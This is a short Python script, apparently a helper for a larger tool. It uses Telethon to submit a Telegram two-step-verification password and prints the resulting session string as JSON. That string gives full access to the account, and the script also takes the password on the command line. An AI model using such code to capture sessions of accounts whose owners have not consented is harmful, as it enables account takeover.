import sys
import json
import asyncio
import os
from telethon import TelegramClient
from telethon.errors import PasswordHashInvalidError

async def verify_password(phone_number, password, api_id, api_hash, session_path):
    try:
        session_file = os.path.join(session_path, phone_number)
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        await client.sign_in(password=password)
        
        session_string = client.session.save()
        await client.disconnect()
        
        return {
            "success": True,
            "session_string": str(session_string)
        }
        
    except PasswordHashInvalidError:
        return {"success": False, "error": "Неверный пароль"}
    except Exception as e:
        return {"success": False, "error": str(e)}

if __name__ == '__main__':
    if len(sys.argv) < 6:
        print(json.dumps({"success": False, "error": "Missing arguments"}))
        sys.exit(1)
    
    phone = sys.argv[1]
    password = sys.argv[2]
    api_id = int(sys.argv[3])
    api_hash = sys.argv[4]
    session_path = sys.argv[5]
    
    result = asyncio.run(verify_password(phone, password, api_id, api_hash, session_path))
    print(json.dumps(result, ensure_ascii=False))
